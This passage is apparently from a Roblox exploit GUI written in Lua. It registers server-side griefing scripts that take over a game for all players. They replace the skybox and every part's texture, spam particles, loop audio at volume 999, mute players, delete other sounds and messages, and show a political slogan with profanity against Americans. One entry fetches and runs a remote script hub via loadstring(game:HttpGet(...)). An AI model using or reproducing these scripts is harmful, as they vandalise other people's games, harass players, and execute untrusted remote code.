		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 0, 0),
		FogEnd = 150,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound4")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound4"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 18.2
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint4"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint4")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint4"
				bro.Parent = workspace
				write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
			end
			task.wait(1)
		end
	end)

	write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint4" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint4" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound4" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("chinaify (batch)", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubbleTalk(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

spawn(function()
	bubbleTalk("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳")
end)

local batchSize = 90
local imageId = "rbxassetid://13464805869"
local musicId = "rbxassetid://134713831368801"

local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = "rbxassetid://15886770889"
		sky.SkyboxDn = "rbxassetid://15886770889"
		sky.SkyboxFt = "rbxassetid://15886770889"
		sky.SkyboxLf = "rbxassetid://15886770889"
		sky.SkyboxRt = "rbxassetid://15886770889"
		sky.SkyboxUp = "rbxassetid://15886770889"
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 0, 0),
		FogEnd = 150,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound4")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound4"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 18.2
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint4"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint4")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint4"
				bro.Parent = workspace
				write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
			end
			task.wait(1)
		end
	end)

	write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint4" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint4" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound4" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("dreamybull", [[
local batchSize = 1000000
local imageId = "rbxassetid://13853621129"
local musicId = "rbxassetid://94356638905764"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
	local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	if not torso then return end

	for _, particle in ipairs(torso:GetChildren()) do
		if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
			particle:Destroy()
		end
	end

	for _, velocitySpread in ipairs({0, 0, 0}) do
		local existing = false

		for _, particle in ipairs(torso:GetChildren()) do
			if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
				existing = true
				break
			end
		end

		if not existing then
			local pe = Instance.new("ParticleEmitter")
			pe.Texture = imageId
			pe.VelocitySpread = velocitySpread
			pe.Parent = torso
		end
	end
end

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				applyParticles(player.Character)
			end
		end
		task.wait(2)
	end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}

	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
			child:Destroy()
		end
	end

	local alreadyHas = false
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture == imageId then
			alreadyHas = true
			break
		end
	end

	if not alreadyHas then
		local pe = Instance.new("ParticleEmitter")
		pe.Texture = imageId
		pe.VelocitySpread = 360
		pe.Rate = 10
		pe.Lifetime = NumberRange.new(5)
		pe.Speed = NumberRange.new(10)
		pe.Parent = part
		pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
	end
end

task.spawn(function()
	while true do
		local parts = {}
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(parts, part)
			end
		end

		for i = 1, #parts, batchSize do
			for j = i, math.min(i + batchSize - 1, #parts) do
				applyParticlesToPart(parts[j])
			end

			task.wait(1)
		end

		task.wait(1)
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound5")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound5"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound5" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)
]], "CS / SS")

cscript("dreamybull (batch)", [[
local batchSize = 90
local imageId = "rbxassetid://13853621129"
local musicId = "rbxassetid://94356638905764"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
	local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	if not torso then return end

	for _, particle in ipairs(torso:GetChildren()) do
		if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
			particle:Destroy()
		end
	end

	for _, velocitySpread in ipairs({0, 0, 0}) do
		local existing = false

		for _, particle in ipairs(torso:GetChildren()) do
			if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
				existing = true
				break
			end
		end

		if not existing then
			local pe = Instance.new("ParticleEmitter")
			pe.Texture = imageId
			pe.VelocitySpread = velocitySpread
			pe.Parent = torso
		end
	end
end

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				applyParticles(player.Character)
			end
		end
		task.wait(2)
	end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}

	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
			child:Destroy()
		end
	end

	local alreadyHas = false
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture == imageId then
			alreadyHas = true
			break
		end
	end

	if not alreadyHas then
		local pe = Instance.new("ParticleEmitter")
		pe.Texture = imageId
		pe.VelocitySpread = 360
		pe.Rate = 10
		pe.Lifetime = NumberRange.new(5)
		pe.Speed = NumberRange.new(10)
		pe.Parent = part
		pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
	end
end

task.spawn(function()
	while true do
		local parts = {}
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(parts, part)
			end
		end

		for i = 1, #parts, batchSize do
			for j = i, math.min(i + batchSize - 1, #parts) do
				applyParticlesToPart(parts[j])
			end

			task.wait(1)
		end

		task.wait(1)
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound5")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound5"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound5" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)
]], "CS / SS")

cscript("ghosthub", [[
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-GhostHub-Universal-Games-25151"))()
]], "LS")

cscript("ds tester 1", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://131178173049173" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://131178173049173"
				Two.Texture = "rbxassetid://131178173049173"
				Three.Texture = "rbxassetid://131178173049173"
				Four.Texture = "rbxassetid://131178173049173"
				Five.Texture = "rbxassetid://131178173049173"
				Six.Texture = "rbxassetid://131178173049173"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://131178173049173"
sky.SkyboxDn = "rbxassetid://131178173049173"
sky.SkyboxFt = "rbxassetid://131178173049173"
sky.SkyboxLf = "rbxassetid://131178173049173"
sky.SkyboxRt = "rbxassetid://131178173049173"
sky.SkyboxUp = "rbxassetid://131178173049173"

sky.Parent = lighting
]], "CS / SS")

cscript("ds tester 2", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://89442759973598" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://89442759973598"
				Two.Texture = "rbxassetid://89442759973598"
				Three.Texture = "rbxassetid://89442759973598"
				Four.Texture = "rbxassetid://89442759973598"
				Five.Texture = "rbxassetid://89442759973598"
				Six.Texture = "rbxassetid://89442759973598"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://89442759973598"
sky.SkyboxDn = "rbxassetid://89442759973598"
sky.SkyboxFt = "rbxassetid://89442759973598"
sky.SkyboxLf = "rbxassetid://89442759973598"
sky.SkyboxRt = "rbxassetid://89442759973598"
sky.SkyboxUp = "rbxassetid://89442759973598"

sky.Parent = lighting
]], "CS / SS")

cscript("ds tester 3", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://82751535106374" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://82751535106374"
				Two.Texture = "rbxassetid://82751535106374"
				Three.Texture = "rbxassetid://82751535106374"
				Four.Texture = "rbxassetid://82751535106374"
				Five.Texture = "rbxassetid://82751535106374"
				Six.Texture = "rbxassetid://82751535106374"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://82751535106374"
sky.SkyboxDn = "rbxassetid://82751535106374"
sky.SkyboxFt = "rbxassetid://82751535106374"
sky.SkyboxLf = "rbxassetid://82751535106374"
sky.SkyboxRt = "rbxassetid://82751535106374"
sky.SkyboxUp = "rbxassetid://82751535106374"

sky.Parent = lighting
]], "CS / SS")

-------------------------------------------------------------------------------------------------------------------------------

unable["commands tab"].Size = UDim2.new(0, 100, 0, 26)
unable["commands tab"].Position = UDim2.new(0, 100, 0, 1)

unable["commands tab"].BackgroundColor3 = unable["default background color"]

unable["commands tab"].BorderColor3 = unable["default border color"]
unable["commands tab"].BorderSizePixel = 1

unable["commands tab"].TextColor3 = unable["default border color"]
unable["commands tab"].Font = Enum.Font.RobotoMono
unable["commands tab"].TextSize = 15
unable["commands tab"].TextScaled = false
unable["commands tab"].Text = "commands"
unable["commands tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["commands tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["commands tab text padding"] = Instance.new("UIPadding")
unable["commands tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["commands tab text padding"].Parent = unable["commands tab"]

unable["commands tab"].Parent = unable["main frame 1"]
unable["commands tab"].ZIndex = 19

-------------------------------------------------------------------------------------------------------------------------------

unable["list of commands"].Size = UDim2.new(0, 393, 0, 164)
unable["list of commands"].Position = UDim2.new(0, 4, 0, 32)
unable["list of commands"].BackgroundColor3 = unable["default background color"]
unable["list of commands"].BorderColor3 = unable["default border color"]
unable["list of commands"].BorderSizePixel = 1
unable["list of commands"].ScrollBarThickness = 8
unable["list of commands"].ScrollBarImageColor3 = unable["default 1/2 color"]
unable["list of commands"].CanvasSize = UDim2.new(0, 0, 0, 0)
unable["list of commands"].Parent = unable["main frame 1"]
unable["list of commands"].ZIndex = 19
unable["list of commands"].Visible = false
